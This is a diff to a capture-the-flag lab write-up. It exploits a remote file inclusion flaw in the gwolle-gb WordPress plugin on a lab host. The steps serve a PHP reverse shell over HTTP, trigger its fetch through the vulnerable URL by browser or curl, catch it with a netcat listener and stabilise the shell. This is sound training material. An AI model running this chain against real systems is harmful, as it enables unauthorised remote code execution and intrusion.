@@ -177,12 +177,44 @@ wpscan --url http://10.10.10.88/webservices/wp/ -e u,ap --plugins-detection aggr
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ab590840-a92a-4baf-8fac-ec2c3e5dc227)
 
++ There's a RFI vulnerability in **http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ip/path**
+
 ## Gaining Access
-+ xxx
++ Create a reverse-shell, and name it **wp-load.php** on your kali attack vm: `cp /usr/share/webshells/php/php-reverse-shell.php wp-load.php`
++ Specify ip and port.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1a21411f-21af-4307-82ff-279894963d88)
+ 
++ Serve it with SimpleHTTPServer where the shell is located: `sudo python3 -m http.server`
++ Set up a netcat listener on the attack machine to receive the reverse shell: `nc -lnvp 4444`
++ Navigate to `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:8000/` on your browser.
++ Get the shell.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bb683987-310f-44f3-8080-66e93bab3ac8)
+
++ **Alternatively**, get shell using **curl**:
+```
+curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:8000/
+```
+
++ Do more stable shell:
+```
+script /dev/null -c bash
+CTRL^Z: Ctrl + Z
+stty raw -echo; fg
+reset
+terminal type? 'screen' or 'xterm'
+export TERM=xterm  
+export SHELL=bash
+stty rows 55 columns 285
+```
+
++ There is no privilege to read the user flag of onuma. Escalate the privileges.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7eaa5593-8c55-4c9f-bfab-61dbf1a28f98)
 
 
-
-## Privilege Escalation
+## Privilege Escalation: from 'www-data' to 'onuma'
 + xxx
 
 
